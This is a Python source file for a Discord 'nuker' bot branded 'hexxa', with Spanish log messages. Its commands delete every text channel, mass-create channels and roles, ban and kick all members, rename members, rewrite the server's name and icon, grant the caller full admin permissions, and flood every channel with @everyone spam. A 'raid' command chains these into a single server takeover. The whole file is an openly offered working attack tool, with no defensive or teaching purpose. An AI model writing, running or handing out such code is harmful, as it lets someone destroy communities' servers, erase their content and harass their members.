import discord
from discord.ext import commands
from discord import Permissions
from colorama import Fore, Style
import random
import asyncio
import aiohttp

TOKEN = ""
MASSNICK = "hexxa"
ROLENAME = "hexxa"

botyz = commands.Bot(command_prefix='$', intents=discord.Intents.all())
botyz.remove_command('help')

@botyz.event
async def on_ready():
    print(f"bot encendido e.e{botyz.user}")

import discord
from discord.ext import commands


import discord
from discord.ext import commands
import asyncio


@botyz.command()
async def nuke(ctx):
    
    tasks = []

    
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):  
            tasks.append(delete_channel(channel))
    
    
    await asyncio.gather(*tasks)

    
    try:
        new_channel = await ctx.guild.create_text_channel('nuked-by-hexxa')
        print(f"nuevo canal creado: {new_channel.name}")
    except Exception as e:
        print(f"error al crear canal: {e}")

    await ctx.message.delete()

async def delete_channel(channel):
    try:
        await channel.delete()
        print(f"canal eliminado: {channel.name}")
    except Exception as e:
        print(f"error al eliminar canal {channel.name}: {e}")

@botyz.command()
async def cchannels(ctx, cantidad: int = 50):
    await ctx.message.delete()  

    nombre = "hexxa"

    
    tasks = []

    
    for i in range(cantidad):
        
        tasks.append(create_channel(ctx.guild, nombre))

    
    await asyncio.gather(*tasks)


async def create_channel(guild, nombre_canal):
        
        await guild.create_text_channel(nombre_canal)

@botyz.command()
async def massban(ctx):
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("no tienes permisos para banear miembros")
        return
    for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"{Fore.GREEN}persona baneada ee {user}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}no se pudo banear {user}: {e}{Fore.RESET}")

@botyz.command()
async def masskick(ctx):
    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("no tienes permisos para kickear members.")
        return
    for user in ctx.guild.members:
        try:
            await user.kick()
            print(f"kickeado {user}")
        except Exception as e:
            print(f"no se pudo kickear a {user}: {e}")


@botyz.command()
async def massnick(ctx, *, name=MASSNICK):
    print(f"cambiar nombres con {name}")
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
            print(f"{Fore.GREEN}nombre cambiado de {member} a {name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}no pude cambiar nombre a {member} nombre a {name}: {e}{Fore.RESET}")

@botyz.command()
async def guild(ctx):
    await ctx.message.delete()
    nombre = "hexxa"
    desc = "hexxa"
    icono = "pon la img aqui"

    try:
        await ctx.guild.edit(name=nombre)
        await ctx.guild.edit(description=desc)
        if icono:
            async with aiohttp.ClientSession() as session:
                async with session.get(icono) as response:
                    if response.status == 200:
                        icon_data = await response.read()
                        await ctx.guild.edit(icon=icon_data)
                        await ctx.send("guild cambiada")
    except discord.HTTPException as e:
        print(f"error al actualizar guild: {e}")
        await ctx.reply(f"error al actualizar guild: {e}")

@botyz.command()
async def perms(ctx):
    if not ctx.author.guild_permissions.manage_roles:
        return
    admin_role = await ctx.guild.create_role(name="*", permissions=discord.Permissions.all())
    await ctx.author.add_roles(admin_role)

@botyz.command()
async def spam(ctx):
    spam_message = "hexxa @everyone"
    channels = ctx.guild.text_channels
    random.shuffle(channels)  

    
    tasks = []
    
    for _ in range(10):  
        for channel in channels:
            tasks.append(send_message(channel, spam_message))
    
    
    await asyncio.gather(*tasks)

import asyncio

@botyz.command()
async def bypass(ctx):
    await ctx.message.delete()

    tasks = []

    
    mensaje = "hexxa"

    
    for x in ctx.guild.channels:
        try:
            tasks.append(x.edit(name="hexxa"))
        except Exception as e:
            print(f"error editando el canal {x.name}: {e}")
            pass

    
    for x in ctx.guild.channels:
        for _ in range(20): 
            try:
                tasks.append(x.send(content=mensaje))
            except Exception as e:
                print(f"error al enviar mensaje al canal {x.name}: {e}")
                pass

    
    await asyncio.gather(*tasks)


@botyz.command()
async def create_roles(ctx, cantidad: int = 100):

    await ctx.message.delete()

    for i in range(cantidad):
        try:
            role = await ctx.guild.create_role(name=ROLENAME)
            print(f"rol '{role.name}' creado ")
        except discord.Forbidden:
            await ctx.send("no tengo permisos para crear roles")
            break
        except discord.HTTPException as e:
            print(f"error al crear el rol: {e}")
            await ctx.send("error al crear los roles")
            break

    await ctx.send(f'{cantidad} roles con el nombre "{ROLENAME}" se crearon')

import random
import asyncio
import discord

@botyz.command()
async def raid(ctx):
    
    await ctx.message.delete()

    
    try:
        await ctx.guild.edit(name="hexxa")
        print(f"nombre del server cambiado a hexxa")
    except Exception as e:
        print(f"error al cambiar el nombre del server: {e}")

    
    delete_tasks = [delete_channel(channel) for channel in ctx.guild.channels[:10]]
    await asyncio.gather(*delete_tasks)

    
    nuke_tasks = [delete_channel(channel) for channel in ctx.guild.channels[:100] if isinstance(channel, discord.TextChannel)]
    await asyncio.gather(*nuke_tasks)

    
    create_tasks = []
    for _ in range(100):  
        create_tasks.append(ctx.guild.create_text_channel('FUCKED BY HEXXA'))
        create_tasks.append(ctx.guild.create_text_channel('PWNED BY HEXXA'))
    await asyncio.gather(*create_tasks)

    
    try:
        new_channel = await ctx.guild.create_text_channel('nuked-by-hexxa')
        print(f"nuevo canal creado: {new_channel.name}")
    except Exception as e:
        print(f"error al crear elcanal: {e}")
    await perform_spam(ctx)

async def delete_channel(channel):
    try:
        await channel.delete()
        print(f"canal eliminado: {channel.name}")
    except Exception as e:
        print(f"no puedo  eliminar: {channel.name}: {e}")

async def perform_spam(ctx):
    spam_message = "hexxa is here @everyone "
    channels = ctx.guild.text_channels
    random.shuffle(channels)  

    tasks = []
    for _ in range(15):  
        for channel in channels[:100]:  
            tasks.append(send_message(channel, spam_message))

    await asyncio.gather(*tasks)

async def send_message(channel, message):
    try:
        await channel.send(message)
        print(f"mensaje enviado a  {channel.name}")
    except Exception as e:
        print(f"no puedo enviar el mensaje a  {channel.name}: {e}")

botyz.run(TOKEN)
